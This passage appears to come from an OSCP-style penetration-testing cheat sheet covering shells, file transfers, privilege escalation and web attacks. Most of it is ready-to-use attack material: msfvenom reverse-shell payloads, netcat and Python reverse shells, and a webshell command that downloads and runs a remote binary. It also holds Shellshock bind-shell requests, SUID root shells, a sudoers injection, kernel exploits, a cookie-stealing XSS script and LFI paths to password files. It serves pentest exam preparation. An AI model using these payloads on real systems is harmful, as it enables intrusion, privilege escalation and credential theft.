    -   msfvenom -p linux/x86/shell\_bind\_tcp LPORT=4444 -f c -b
        "\\x00\\x0a\\x0d\\x20" e x86/shikata\_ga\_nai

    -   Connect to the shell with netcat:  
        nc -v $ip 4444
        
Shells
===================================================================================================================================

-   Netcat Shell Listener  

    `nc -nlvp 4444`

-   Spawning a TTY Shell - Break out of Jail or limited shell
         You should almost always upgrade your shell after taking control of an apache or www user.
         
        (For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )
        
        (hint: sudo -l to see what you can run)
        
     -   You may encounter limited shells that use rbash and only allow you to execute a single command per session.
         You can overcome this by executing an SSH shell to your localhost:
         
               ssh user@$ip nc $localip 4444 -e /bin/sh
               enter user's password
               python -c 'import pty; pty.spawn("/bin/sh")'
               export TERM=linux
         
      `python -c 'import pty; pty.spawn("/bin/sh")'`

               python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

      `echo os.system('/bin/bash')`

      `/bin/sh -i`

      `perl e 'exec "/bin/sh";'`

      perl: `exec "/bin/sh";`

      ruby: `exec "/bin/sh"`

      lua: `os.execute('/bin/sh')`

      From within IRB: `exec "/bin/sh"`


      From within vi: `:!bash`
     or
     
      `:set shell=/bin/bash:shell`
     
      From within vim `':!bash':`

      From within nmap: `!sh`

      From within tcpdump
      
         echo $id\\n/bin/netcat $ip 443 e /bin/bash > /tmp/.test chmod +x /tmp/.test sudo tcpdump ln I eth- -w /dev/null W 1 G 1 z /tmp/.tst Z root

      From busybox  `/bin/busybox telnetd -|/bin/sh -p9999`

-   Pen test monkey PHP reverse shell  
    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

-   php-findsock-shell - turns PHP port 80 into an interactive shell  
    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)

-   Perl Reverse Shell  
    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

-   PHP powered web browser Shell b374k with file upload etc.  
    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)

-   Windows reverse shell - PowerSploits Invoke-Shellcode script and inject a Meterpreter shell 
    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
    
-   Web Backdoors from Fuzzdb 
    https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors

-   Creating Meterpreter Shells with MSFVenom - http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/
      
      *Linux*
      
      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
      
      *Windows*
      
      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
      
      *Mac*

      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
      
      **Web Payloads**
      
      *PHP*
      
      `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
      
      OR
      
      `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
      
      Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
      
      `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
      
      *ASP*

      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
      
      *JSP*

      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
      
      *WAR*

      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
      
      **Scripting Payloads**
      
      *Python*

      `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
      
      *Bash*

      `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
      
      *Perl*

      `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
      
      **Shellcode**
      
      For all shellcode see msfvenom help-formats for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

      *Linux Based Shellcode*

      `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
      
      *Windows Based Shellcode*

      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
      
      *Mac Based Shellcode*

      `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

      **Handlers**
      Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

         use exploit/multi/handler
         set PAYLOAD <Payload name>
         set LHOST <LHOST value>
         set LPORT <LPORT value>
         set ExitOnSession false
         exploit -j -z
      
      Once the required values are completed the following command will execute your handler  msfconsole -L -r 

-   SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/

         use auxiliary/scanner/ssh/ssh_login
         use post/multi/manage/shell_to_meterpreter

-   SBD.exe

     sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only.
     sbd.exe (part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a windows box as a Netcat alternative.

-   Shellshock

    -   Testing for shell shock with NMap
    
    `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`

    -   git clone https://github.com/nccgroup/shocker

    `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`

    -   Shell Shock SSH Forced Command  
        Check for forced command by enabling all debug output with ssh  
        
              ssh -vvv  
              ssh -i noob noob@$ip '() { :;}; /bin/bash'

    -   cat file (view file contents)  
    
              echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80

    -   Shell Shock run bind shell  
    
             echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80

File Transfers
============================================================================================================

-   Post exploitation refers to the actions performed by an attacker,
    once some level of control has been gained on his target.

-   Simple Local Web Servers

    -   Run a basic http server, great for serving up shells etc  
        python -m SimpleHTTPServer 80

    -   Run a basic Python3 http server, great for serving up shells
        etc  
        python3 -m http.server

    -   Run a ruby webrick basic http server  
        ruby -rwebrick -e "WEBrick::HTTPServer.new  
        (:Port => 80, :DocumentRoot => Dir.pwd).start"

    -   Run a basic PHP http server  
        php -S $ip:80

-   Creating a wget VB Script on Windows:  
    [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)

-   Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):

         echo Set args = Wscript.Arguments  >> webdl.vbs
         timeout 1
         echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
         timeout 1
         echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
         timeout 1
         echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
         timeout 1
         echo xHttp.Open "GET", Url, False  >> webdl.vbs
         timeout 1
         echo xHttp.Send  >> webdl.vbs
         timeout 1
         echo with bStrm      >> webdl.vbs
         timeout 1
         echo 	.type = 1 '      >> webdl.vbs
         timeout 1
         echo 	.open      >> webdl.vbs
         timeout 1
         echo 	.write xHttp.responseBody      >> webdl.vbs
         timeout 1
         echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
         timeout 1
         echo end with >> webdl.vbs
         timeout 1
         echo

      The file can be run using the following syntax:
      
      `C:\temp\cscript.exe webdl.vbs`
      
-   Mounting File Shares

    -   Mount NFS share to /mnt/nfs  
        mount $ip:/vol/share /mnt/nfs

-   HTTP Put  
    nmap -p80 $ip --script http-put --script-args
    http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php

-   Uploading Files
    -------------------------------------------------------------------------------------------------------------

    -   SCP
    
        scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
        
        scp localfile username@$ip:~/Folder/
        
        scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
        

    -   Webdav with Davtest- Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
    
        `davtest -move -sendbd auto -url http://$ip`
      
        https://github.com/cldrn/davtest
        
        You can also upload a file using the PUT method with the curl command:
        
        `curl -T 'leetshellz.txt' 'http://$ip'`
        
        And rename it to an executable file using the MOVE method with the curl command:

        `curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'`

    -   Upload shell using limited php shell cmd  
        use the webshell to download and execute the meterpreter  
        \[curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O
        /tmp/evil" http://$ip/files/sh.php  
        \[curl -s --data "cmd=chmod 777 /tmp/evil"
        http://$ip/files/sh.php  
        curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php

    -   TFTP  
        mkdir /tftp  
        atftpd --daemon --port 69 /tftp  
        cp /usr/share/windows-binaries/nc.exe /tftp/  
        EX. FROM WINDOWS HOST:  
        C:\\Users\\Offsec>tftp -i $ip get nc.exe

    -   FTP  
        apt-get update && apt-get install pure-ftpd  
          
        \#!/bin/bash  
        groupadd ftpgroup  
        useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
        pure-pw useradd offsec -u ftpuser -d /ftphome  
        pure-pw mkdb  
        cd /etc/pure-ftpd/auth/  
        ln -s ../conf/PureDB 60pdb  
        mkdir -p /ftphome  
        chown -R ftpuser:ftpgroup /ftphome/  
          
        /etc/init.d/pure-ftpd restart

-   Packing Files
    -------------------------------------------------------------------------------------------------------------

    -   Ultimate Packer for eXecutables  
        upx -9 nc.exe

    -   exe2bat - Converts EXE to a text file that can be copied and
        pasted  
        locate exe2bat  
        wine exe2bat.exe nc.exe nc.txt

    -   Veil - Evasion Framework -
        https://github.com/Veil-Framework/Veil-Evasion  
        apt-get -y install git  
        git clone https://github.com/Veil-Framework/Veil-Evasion.git  
        cd Veil-Evasion/  
        cd setup  
        setup.sh -c

Privilege Escalation
==================================================================================================================

*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*


-   Linux Privilege Escalation
    ------------------------------------------------------------------------------------------------------------------------

-   Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
    [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

-   Try the obvious - Maybe the user is root or can sudo to root:  
    
    `id` 
    
    `sudo su`
    
-   Here are the commands I have learned to use to perform linux enumeration and privledge escalation:

    What users can login to this box (Do they use thier username as thier password)?:
    
    `grep -vE "nologin|false" /etc/passwd`  
    
    What kernel version are we using? Do we have any kernel exploits for this version?
    
    `uname -a`
    
    `searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"`
    
    What applications have active connections?:
    
    `netstat -tulpn`

    What services are running as root?:
    
    `ps aux | grep root`
    
    What files run as root / SUID / GUID?:

         find / -perm +2000 -user root -type f -print
         find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
         find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
         find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
         find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
         for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
         find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

    What folders are world writeable?:
    
         find / -writable -type d 2>/dev/null      # world-writeable folders
         find / -perm -222 -type d 2>/dev/null     # world-writeable folders
         find / -perm -o w -type d 2>/dev/null     # world-writeable folders
         find / -perm -o x -type d 2>/dev/null     # world-executable folders
         find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
    
-   There are a few scripts that can automate the linux enumeration process:

      - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.

      - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - 
      
         [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)

      - LinEnum - (Recently Updated)
      
      [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
      
      - linux-exploit-suggester (Recently Updated)
      
      [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
      
      -   Highon.coffee Linux Local Enum - Great enumeration script!
      
          `wget https://highon.coffee/downloads/linux-local-enum.sh`

      -   Linux Privilege Exploit Suggester  (Old has not been updated in years)
      
    [https://github.com/PenturaLabs/Linux\_Exploit\_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)

      -   Linux post exploitation enumeration and exploit checking tools  
      
    [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
    

Handy Kernel Exploits

-   CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)

    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
    
         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
         $ ./i-can-haz-modharden
         [+] launching root shell!
         # id
         uid=0(root) gid=0(root)

-   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
    [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)

-   CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
    [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
    Linux CVE 2012-0056  
    
          wget -O exploit.c http://www.exploit-db.com/download/18411 
          gcc -o mempodipper exploit.c  
          ./mempodipper

-   CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
    [https://dirtycow.ninja/](https://dirtycow.ninja/)  
    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  

-   Run a command as a user other than root  

          sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf

-   Add a user or change a password

          /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
          echo thePassword | passwd haxzor --stdin

-   Local Privilege Escalation Exploit in Linux

    -   **SUID** (**S**et owner **U**ser **ID** up on execution)  
        Often SUID C binary files are required to spawn a shell as a
        superuser, you can update the UID / GID and shell as required.  
          
        below are some quick copy and paste examples for various
        shells:  
     
              SUID C Shell for /bin/bash  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/bash");  
              }  

              SUID C Shell for /bin/sh  

              int main(void){  
              setresuid(0, 0, 0);  
              system("/bin/sh");  
              }  

              Building the SUID Shell binary  
              gcc -o suid suid.c  
              For 32 bit:  
              gcc -m32 -o suid suid.c

    -   Create and compile an SUID from a limited shell (no file transfer)  
        
              echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
              gcc privsc.c -o privsc

-   Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:

    `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
    
-   You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable
    to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on 
    port 4444.
    
         set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
         echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
         chmod +x ssh

-   SearchSploit  

              searchsploit uncsearchsploit apache 2.2  
              searchsploit "Linux Kernel"  
              searchsploit linux 2.6 | grep -i ubuntu | grep local  
              searchsploit slmail

 -   Kernel Exploit Suggestions for Kernel Version 3.0.0  
 
     `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`

-   Precompiled Linux Kernel Exploits  - ***Super handy if GCC is not installed on the target machine!***

    [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)    

-   Collect root password

    `cat /etc/shadow |grep root`
    
-   Find and display the proof.txt or flag.txt - LOOT!

            cat `find / -name proof.txt -print`

-   Windows Privilege Escalation
    --------------------------------------------------------------------------------------------------------------------------

-   Windows Privilege Escalation resource
    http://www.fuzzysecurity.com/tutorials/16.html

-   Metasploit Meterpreter Privilege Escalation Guide
    https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

-   Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:  
    
    `whoami` 
    
    `net user "%username%"`

-   Try the getsystem command using meterpreter - rarely works but is worth a try.

    `meterpreter > getsystem`

-   No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).
     
     Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report:

         @echo --------- BASIC WINDOWS RECON ---------  > report.txt
         timeout 1
         net config Workstation  >> report.txt
         timeout 1
         systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
         timeout 1
         hostname >> report.txt
         timeout 1
         net users >> report.txt
         timeout 1
         ipconfig /all >> report.txt
         timeout 1
         route print >> report.txt
         timeout 1
         arp -A >> report.txt
         timeout 1
         netstat -ano >> report.txt
         timeout 1
         netsh firewall show state >> report.txt	
         timeout 1
         netsh firewall show config >> report.txt
         timeout 1
         schtasks /query /fo LIST /v >> report.txt
         timeout 1
         tasklist /SVC >> report.txt
         timeout 1
         net start >> report.txt
         timeout 1
         DRIVERQUERY >> report.txt
         timeout 1
         reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
         timeout 1
         reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
         timeout 1
         dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
         timeout 1
         findstr /si password *.xml *.ini *.txt >> report.txt
         timeout 1
         reg query HKLM /f password /t REG_SZ /s >> report.txt
         timeout 1
         reg query HKCU /f password /t REG_SZ /s >> report.txt 
         timeout 1
         dir "C:\"
         timeout 1
         dir "C:\Program Files\" >> report.txt
         timeout 1
         dir "C:\Program Files (x86)\"
         timeout 1
         dir "C:\Users\"
         timeout 1
         dir "C:\Users\Public\"
         timeout 1
         echo REPORT COMPLETE!


-   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

         cadavar http://$ip
         dav:/> put aspshell.txt
         Uploading aspshell.txt to `/aspshell.txt':
         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
         dav:/> copy aspshell.txt aspshell3.asp;.txt
         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
         dav:/> exit

         msf > use exploit/multi/handler
         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
         msf exploit(handler) > set LHOST 1.2.3.4
         msf exploit(handler) > set LPORT 80
         msf exploit(handler) > set ExitOnSession false
         msf exploit(handler) > exploit -j

         curl http://$ip/aspshell3.asp;.txt

         [*] Started reverse TCP handler on 1.2.3.4:443 
         [*] Starting the payload handler...
         [*] Sending stage (957487 bytes) to 1.2.3.5
         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

-   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

         pip install pyinstaller
         wget -O exploit.py http://www.exploit-db.com/download/31853  
         python pyinstaller.py --onefile exploit.py

-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 

      https://www.exploit-db.com/exploits/6705/
   
      https://github.com/Re4son/Churrasco
      
         c:\Inetpub>churrasco
         churrasco
         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

         c:\Inetpub>churrasco -d "net user /add <username> <password>"
         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
    
          python pyinstaller.py --onefile ms11-080.py  
          mx11-080.exe -O XP
    
-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

      MS16-032 https://www.exploit-db.com/exploits/39719/
      
      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
      
    
-   Powershell Priv Escalation Tools
    https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

      -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

               PsExec v2.2 - Execute processes remotely
               Copyright (C) 2001-2016 Mark Russinovich
               Sysinternals - www.sysinternals.com

      -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
               Enter the password for Test:
               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

      -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

               $username = '<username here>'
               $password = '<password here>'
               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

             Next run this script using powershell.exe:

             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


-   Windows Service Configuration Viewer - Check for misconfigurations
    in services that can lead to privilege escalation. You can replace
    the executable with your own and have windows execute whatever code
    you want as the privileged user.  
    icacls scsiaccess.exe

         scsiaccess.exe  
         NT AUTHORITY\SYSTEM:(I)(F)  
         BUILTIN\Administrators:(I)(F)  
         BUILTIN\Users:(I)(RX)  
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
         Everyone:(I)(F)

-   Compile a custom add user command in windows using C  

      ```
      root@kali:~# cat useradd.c  
      #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
      int main ()  
      {  
      int i;  
      i=system ("net localgroup administrators low /add");  
      return 0;  
      }
      ```  

      `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

-   Group Policy Preferences (GPP)  
    A common useful misconfiguration found in modern domain environments
    is unprotected Windows GPP settings files

    -   map the Domain controller SYSVOL share  
        
        `net use z:\\dc01\SYSVOL`

    -   Find the GPP file: Groups.xml  
        
        `dir /s Groups.xml`

    -   Review the contents for passwords  
        
        `type Groups.xml`

    -   Decrypt using GPP Decrypt  
        
        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
        
-   Find and display the proof.txt or flag.txt - get the loot!
    
    `#meterpreter  >     run  post/windows/gather/win_privs`
    `cd\ & dir /b /s proof.txt`
    `type c:\pathto\proof.txt`
    

Client, Web and Password Attacks
==============================================================================================================================

-   <span id="_pcjm0n4oppqx" class="anchor"><span id="_Toc480741817" class="anchor"></span></span>Client Attacks
    ------------------------------------------------------------------------------------------------------------

    -   MS12-037- Internet Explorer 8 Fixed Col Span ID  
        wget -O exploit.html
        <http://www.exploit-db.com/download/24017>  
        service apache2 start

    -   JAVA Signed Jar client side attack  
        echo '<applet width="1" height="1" id="Java Secure"
        code="Java.class" archive="SignedJava.jar"><param name="1"
        value="http://$ip:80/evil.exe"></applet>' >
        /var/www/html/java.html  
        User must hit run on the popup that occurs.

    -   Linux Client Shells  
        [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

    -   Setting up the Client Side Exploit

    -   Swapping Out the Shellcode

    -   Injecting a Backdoor Shell into Plink.exe  
        backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip 
        -P 4444 -s reverse\_shell\_tcp

-   <span id="_n6fr3j21cp1m" class="anchor"><span id="_Toc480741818" class="anchor"></span></span>Web Attacks
    ---------------------------------------------------------------------------------------------------------

    -   Web Shag Web Application Vulnerability Assessment Platform  
        webshag-gui

    -   Web Shells  
        [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
        `ls -l /usr/share/webshells/`

    -   Generate a PHP backdoor (generate) protected with the given
        password (s3cr3t)  
        weevely generate s3cr3t  
        weevely http://$ip/weevely.php s3cr3t

    -   Java Signed Applet Attack

    -   HTTP / HTTPS Webserver Enumeration

        -   OWASP Dirbuster

        -   nikto -h $ip

    -   Essential Iceweasel Add-ons  
        Cookies Manager
        https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/  
        Tamper Data  
        https://addons.mozilla.org/en-US/firefox/addon/tamper-data/

    -   Cross Site Scripting (XSS)  
        significant impacts, such as cookie stealing and authentication
        bypass, redirecting the victims browser to a malicious HTML
        page, and more

    -   Browser Redirection and IFRAME Injection
        ```html
        <iframe SRC="http://$ip/report" height = "0" width="0"></iframe>
        ```

    -   Stealing Cookies and Session Information
        ```javascript
        <javascript>  
        new image().src="http://$ip/bogus.php?output="+document.cookie;  
        </script>
        ```
        nc -nlvp 80

-   File Inclusion Vulnerabilities 
    -----------------------------------------------------------------------------------------------------------------------------

    -   Local (LFI) and remote (RFI) file inclusion vulnerabilities are
        commonly found in poorly written PHP code.

    -   fimap - There is a Python tool called fimap which can be
        leveraged to automate the exploitation of LFI/RFI
        vulnerabilities that are found in PHP (sqlmap for LFI):  
        [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)

        -   Gaining a shell from phpinfo()  
            fimap + phpinfo() Exploit - If a phpinfo() file is present,
            its usually possible to get a shell, if you dont know the
            location of the phpinfo file fimap can probe for it, or you
            could use a tool like OWASP DirBuster.

    -   For Local File Inclusions look for the include() function in PHP
        code.
        ```php  
        include("lang/".$_COOKIE['lang']);  
        include($_GET['page'].".php");
        ```

    -   LFI - Encode and Decode a file using base64  
        ```bash
        curl -s \
        "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
        | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
        ```

    -   LFI - Download file with base 64 encoding  
        [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)

    -   LFI Linux Files:  
        /etc/issue  
        /proc/version  
        /etc/profile  
        /etc/passwd  
        /etc/passwd  
        /etc/shadow  
        /root/.bash\_history  
        /var/log/dmessage  
        /var/mail/root  
        /var/spool/cron/crontabs/root

    -   LFI Windows Files:  
        %SYSTEMROOT%\\repair\\system  
        %SYSTEMROOT%\\repair\\SAM  
        %SYSTEMROOT%\\repair\\SAM  
        %WINDIR%\\win.ini  
        %SYSTEMDRIVE%\\boot.ini  
        %WINDIR%\\Panther\\sysprep.inf  
        %WINDIR%\\system32\\config\\AppEvent.Evt

    -   LFI OSX Files:  
        /etc/fstab  
        /etc/master.passwd  
        /etc/resolv.conf  
        /etc/sudoers  
        /etc/sysctl.conf

    -   LFI - Download passwords file  
        [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
        [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)

